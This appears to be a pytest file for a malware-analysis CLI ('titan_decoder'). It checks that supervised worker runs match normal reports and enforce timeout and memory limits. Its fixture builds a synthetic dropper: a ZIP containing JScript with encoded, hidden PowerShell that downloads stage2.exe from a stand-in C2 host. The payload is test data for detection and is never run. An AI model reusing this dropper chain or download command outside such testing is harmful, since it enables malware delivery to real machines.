"""`titan cli --file X --supervised` runs core analysis in a bounded worker.

Until now the supervised worker existed but nothing used it on the primary
single-file path, so the timeout and memory ceilings Titan advertises were
reported as unenforceable rather than enforced. This wires the two halves
together.

The integration only means anything if the supervised report is the same
report. Two things make that non-trivial: node payloads are deliberately
excluded from the serialized report, so anything needing raw bytes has to run
inside the worker, and a stage that quietly finds nothing looks exactly like a
stage that found nothing.
"""

import json
import subprocess
import sys
import zipfile
from io import BytesIO
from pathlib import Path

import pytest

ROOT = Path(__file__).parents[1]
VOLATILE = {"analysis_id", "started_at", "finished_at", "duration_ms"}


def _sample() -> bytes:
    """A layered dropper: ZIP -> JS host -> carved base64 -> gzip -> PowerShell."""
    import base64
    import gzip

    inner = (
        "$c = New-Object Net.WebClient; "
        "$c.DownloadFile('http://supervised.c2.test/stage2.exe', \"$env:TEMP\\a.exe\")"
    )
    encoded = base64.b64encode(inner.encode("utf-16le")).decode()
    command = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
    blob = base64.b64encode(gzip.compress(command.encode(), mtime=0)).decode()
    dropper = f"var s = WScript.CreateObject('WScript.Shell');\nvar b = '{blob}';\n"
    buffer = BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("invoice/dropper.js", dropper)
    return buffer.getvalue()


def _run(tmp_path: Path, *extra: str, config: dict | None = None):
    sample = tmp_path / "sample.zip"
    sample.write_bytes(_sample())
    out = tmp_path / f"report{len(extra)}{'c' if config else ''}.json"
    argv = [
        sys.executable,
        "-m",
        "titan_decoder.cli",
        "--file",
        str(sample),
        "--enable-detections",
        "--offline",
        "--out",
        str(out),
        *extra,
    ]
    if config is not None:
        path = tmp_path / "config.json"
        path.write_text(json.dumps(config), encoding="utf-8")
        argv += ["--config", str(path)]
    completed = subprocess.run(argv, cwd=ROOT, capture_output=True, text=True)
    report = json.loads(out.read_text(encoding="utf-8")) if out.exists() else None
    return completed, report


def _comparable(report: dict) -> dict:
    trimmed = dict(report)
    meta = {k: v for k, v in trimmed.get("meta", {}).items() if k not in VOLATILE}
    meta.pop("supervised", None)
    trimmed["meta"] = meta
    return trimmed


@pytest.fixture(scope="module")
def sample_reports(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("supervised")
    normal_proc, normal = _run(tmp)
    supervised_proc, supervised = _run(tmp, "--supervised")
    assert normal_proc.returncode == 0, normal_proc.stderr
    assert supervised_proc.returncode == 0, supervised_proc.stderr
    return normal, supervised


def test_supervised_report_matches_the_in_process_report(sample_reports):
    normal, supervised = sample_reports
    assert _comparable(supervised) == _comparable(normal)


def test_supervised_run_still_reaches_the_buried_indicator(sample_reports):
    _normal, supervised = sample_reports
    assert "http://supervised.c2.test/stage2.exe" in supervised["iocs"]["urls"]


def test_supervised_run_records_the_bounds_it_enforced(sample_reports):
    _normal, supervised = sample_reports
    enforced = supervised["meta"]["supervised"]
    assert enforced["enforced_by"] == "os_process_limits"
    for key in (
        "timeout_seconds",
        "max_memory_mb",
        "max_input_bytes",
        "max_output_bytes",
    ):
        assert enforced[key] > 0, key


def test_assurance_runs_inside_the_worker(sample_reports):
    # Needs raw payloads, so it cannot run in the parent.
    _normal, supervised = sample_reports
    assert supervised["assurance"]["verdict"]


def test_yara_scans_artifacts_inside_the_worker(tmp_path):
    # The whole point: scanning in the parent would see zero payloads and
    # record a completed scan with no matches -- a clean verdict nobody made.
    rules = str(ROOT / "examples" / "yara_rules" / "titan_starter.yar")
    _normal_proc, normal = _run(tmp_path, "--yara-rules", rules)
    _sup_proc, supervised = _run(tmp_path, "--supervised", "--yara-rules", rules)
    assert normal["yara"]["state"] == "completed"
    assert supervised["yara"]["state"] == "completed"
    assert len(supervised["yara"]["matches"]) == len(normal["yara"]["matches"])
    assert supervised["yara"]["matches"], "starter rules should match this dropper"


def test_timeout_yields_no_verdict(tmp_path):
    completed, report = _run(
        tmp_path, "--supervised", config={"analysis_timeout_seconds": 0.01}
    )
    assert completed.returncode == 2
    assert report is None, "a terminated run must not leave a report behind"
    assert json.loads(completed.stderr.splitlines()[0]) == {
        "status": "indeterminate",
        "reason": "timeout",
    }


def test_memory_limit_yields_no_verdict(tmp_path):
    completed, report = _run(tmp_path, "--supervised", config={"max_memory_mb": 8})
    assert completed.returncode == 2
    assert report is None
    assert '"indeterminate"' in completed.stderr


def test_supervised_requires_a_file(tmp_path):
    completed = subprocess.run(
        [sys.executable, "-m", "titan_decoder.cli", "--supervised"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert completed.returncode != 0
    assert "--supervised requires --file" in completed.stderr
